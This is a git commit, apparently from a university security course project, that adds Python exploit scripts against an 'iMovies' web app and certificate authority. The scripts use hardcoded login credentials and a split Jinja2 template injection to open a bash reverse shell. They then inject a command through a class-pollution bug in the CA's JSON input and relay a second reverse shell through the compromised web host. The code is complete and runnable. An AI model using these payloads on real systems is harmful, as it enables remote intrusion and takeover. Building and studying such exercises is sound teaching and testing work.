f478d2b29e9c0c7800bca5d044d8a7313abcf73a
Damiano Amatruda <damatruda@student.ethz.ch>
2023-10-22 19:06:57 +0200

    BACKDOOR: Add exploits for WEB and CA
    Co-authored-by: HainLuud <HainLuud@users.noreply.github.com>

---
+++ backdoor/backdoor.py
@@ -0,0 +1,157 @@
+#!/usr/bin/env python3
+
+import html
+import re
+import sys
+from base64 import b64encode
+
+import requests
+from bs4 import BeautifulSoup
+from pwn import *
+from urllib3.exceptions import InsecureRequestWarning
+
+WEB_HOST = 'https://imovies.ch:8000'
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+
+def web_login(session, uid, pwd, next='/'):
+    url = f'{WEB_HOST}/login'
+    params = {'next': next}
+    response = session.get(url, params=params)
+    response.raise_for_status()
+    soup = BeautifulSoup(response.text, 'html.parser')
+    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
+
+    url = f'{WEB_HOST}/login'
+    data = {'uid': uid, 'pwd': pwd, 'next': next, 'csrf_token': csrf_token}
+    response = session.post(url, data=data)
+    response.raise_for_status()
+
+    return response.text
+
+
+def web_index(session):
+    url = f'{WEB_HOST}/'
+    response = session.get(url)
+    response.raise_for_status()
+
+    return response.text
+
+
+def web_issue(session, uid, email=None, firstname=None, lastname=None, passphrase=''):
+    url = f'{WEB_HOST}/profile/{uid}'
+    response = session.get(url)
+    response.raise_for_status()
+    soup = BeautifulSoup(response.text, 'html.parser')
+
+    email = email or soup.find('input', {'name': 'email'})['value']
+    firstname = firstname or soup.find('input', {'name': 'firstname'})['value']
+    lastname = lastname or soup.find('input', {'name': 'lastname'})['value']
+    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
+
+    url = f'{WEB_HOST}/profile/{uid}/issue'
+    data = {'email': email, 'firstname': firstname, 'lastname': lastname, 'passphrase': passphrase, 'csrf_token': csrf_token}
+    response = session.post(url, data=data)
+    response.raise_for_status()
+
+    return response.text
+
+
+def web_render(session, uid, part_1, part_2):
+    assert part_1 and len(part_1) <= 64
+    assert part_2 and len(part_2) <= 64
+
+    web_issue(session, uid, firstname=part_1, lastname=part_2)
+    text = web_index(session)
+    answer = html.unescape(html.unescape(re.search(r'Hello, (?P<name>.*)\. This is the iMovies Certificate Center\.', text, re.DOTALL).group('name'))).strip()
+
+    return answer
+
+
+def web_subclasses():
+    uid = 'ps'
+    pwd = 'KramBamBuli'
+
+    session = requests.session()
+    session.verify = False
+
+    web_login(session, uid, pwd, f'/profile/{uid}')
+
+    part_1 = "{% for x in ''.__class__.mro()[1].__subclasses__() -%}"
+    part_2 = "{{ x.__name__ }}\n{% endfor %}"
+
+    answer = web_render(session, uid, part_1, part_2)
+    subclasses = [a.strip() for a in answer.split('\n')]
+
+    for i, subclass in enumerate(subclasses):
+        print(f'{i}: {subclass}')
+
+
+def web_reverse_shell(remote_attacker_ip, remote_attacker_port):
+    uid = 'ps'
+    pwd = 'KramBamBuli'
+
+    session = requests.session()
+    session.verify = False
+
+    web_login(session, uid, pwd, f'/profile/{uid}')
+
+    part_1 = f"{{{{''.__class__.mro()[1].__subclasses__()[650](['/bin/bash','-c',"
+    part_2 = f"'/bin/bash -i >& /dev/tcp/{remote_attacker_ip}/{remote_attacker_port} 0>&1'])}}}}"
+
+    answer = web_render(session, uid, part_1, part_2)
+
+    log.info(answer)
+
+
+def web_run_py_file(io, filepath, args=(), exit=True):
+    def quote(s):
+        return f"'{s}'"
+
+    with open(filepath, 'rb') as f:
+        command = f'python3 -c "$(echo \'{b64encode(f.read()).decode()}\' | base64 --decode)" {" ".join(quote(arg) for arg in args)}{"; exit" if exit else ""}'.encode()
+
+    return io.sendline(command)
+
+
+def web_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port):
+    web_listener = listen(local_attacker_port)
+    web_reverse_shell(remote_attacker_ip, remote_attacker_port)
+    web_io = web_listener.wait_for_connection()
+    web_io.interactive(prompt='')
+
+
+def ca_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port):
+    web_listener = listen(local_attacker_port)
+    web_reverse_shell(remote_attacker_ip, remote_attacker_port)
+    web_io = web_listener.wait_for_connection()
+    web_run_py_file(web_io, './payloads/ca_forward.py', args=(remote_attacker_ip, remote_attacker_port))
+    web_listener.close()
+
+    ca_listener = listen(local_attacker_port)
+    ca_io = ca_listener.wait_for_connection()
+    ca_io.interactive(prompt='')
+
+
+def main():
+    if len(sys.argv) < 5:
+        print(f'Usage: {sys.argv[0]} LOCAL_ATTACKER_PORT REMOTE_ATTACKER_IP REMOTE_ATTACKER_PORT <web|ca>', file=sys.stderr)
+        sys.exit(2)
+
+    local_attacker_port = int(sys.argv[1])
+    remote_attacker_ip = sys.argv[2]
+    remote_attacker_port = int(sys.argv[3])
+    vulnerable_host = sys.argv[4]
+
+    if vulnerable_host == 'web':
+        web_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port)
+    elif vulnerable_host == 'ca':
+        ca_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port)
+    else:
+        print(f"Unknown vulnerable host '{vulnerable_host}'")
+        sys.exit(2)
+
+
+if __name__ == '__main__':
+    main()
---
+++ backdoor/payloads/ca_forward.py
@@ -0,0 +1,109 @@
+#!/usr/bin/env python3
+
+import random
+import socket
+import sys
+import threading
+import time
+
+import requests
+from urllib3.exceptions import InsecureRequestWarning
+
+CA_HOST = 'https://ca.imovies.ch:8000'
+BUFFER_SIZE = 4096
+TIMEOUT = 60
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+
+def get_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(('8.8.8.8', 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+
+
+def ca_issue(session, uid, email='', firstname='', lastname='', passphrase='', extra_data = {}):
+    url = f'{CA_HOST}/issue_certificate'
+    json = {
+        'cert_data': None,
+        'uid': uid,
+        'lastname': lastname,
+        'firstname': firstname,
+        'email': email,
+        'passphrase': passphrase,
+        'revoke': False,
+        **extra_data,
+    }
+    response = session.post(url, json=json, verify=False)
+    response.raise_for_status()
+
+    return response.text
+
+
+def ca_run_command(session, uid, command):
+    original_backup_address = 'bak.imovies.ch'
+    ca_issue(session, uid, extra_data={'__class__.__init__.__globals__.CA.BACKUP_ADDRESS': f'{original_backup_address}; {command} &'})
+    ca_issue(session, uid, extra_data={'__class__.__init__.__globals__.CA.BACKUP_ADDRESS': original_backup_address})  # Clean up
+
+
+def ca_reverse_shell(remote_attacker_ip, remote_attacker_port):
+    uid = 'ps'
+    session = requests.session()
+    session.verify = False
+    ca_run_command(session, uid, f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{remote_attacker_ip}/{remote_attacker_port} 0>&1'")
+
+
+def forward_data(source_socket, target_socket):
+    try:
+        while True:
+            data = source_socket.recv(BUFFER_SIZE)
+            if not data:
+                break
+            target_socket.send(data)
+    except:
+        pass
+    finally:
+        source_socket.close()
+        target_socket.close()
+
+
+def ca_forward(local_web_ip, local_web_port, remote_attacker_ip, remote_attacker_port):
+    ca_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ca_listener.bind((local_web_ip, local_web_port))
+    ca_listener.listen(1)
+
+    ca_reverse_shell(local_web_ip, local_web_port)
+
+    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    attacker_socket.connect((remote_attacker_ip, remote_attacker_port))
+
+    ca_socket, _ = ca_listener.accept()
+
+    ca_to_attacker = threading.Thread(target=forward_data, args=(ca_socket, attacker_socket), daemon=True)
+    attacker_to_ca = threading.Thread(target=forward_data, args=(attacker_socket, ca_socket), daemon=True)
+
+    ca_to_attacker.start()
+    attacker_to_ca.start()
+
+    time.sleep(TIMEOUT)
+
+    ca_listener.close()
+
+
+def main():
+    if len(sys.argv) < 3:
+        print(f'Usage: {sys.argv[0]} REMOTE_ATTACKER_IP REMOTE_ATTACKER_PORT', file=sys.stderr)
+        sys.exit(2)
+
+    local_web_ip = get_ip()
+    local_web_port = random.randint(1024, 49151)
+    remote_attacker_ip = sys.argv[1]
+    remote_attacker_port = int(sys.argv[2])
+
+    ca_forward(local_web_ip, local_web_port, remote_attacker_ip, remote_attacker_port)
+
+
+if __name__ == '__main__':
+    main()
